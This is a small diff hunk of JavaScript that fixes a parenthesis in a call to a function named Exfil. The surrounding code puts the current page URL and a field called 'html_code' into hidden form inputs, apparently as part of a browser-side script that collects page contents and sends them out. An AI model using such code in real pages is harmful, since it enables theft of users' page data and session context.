@@ -30,7 +30,8 @@ document.body.appendChild(elem);
   input.value = document.location.href;
   form.appendChild(input);
   });
-  Exfil((function(form){
+  
+  Exfil(function(form){
    var input = document.createElement("input");
   input.type = "hidden";
   input.name = "html_code";
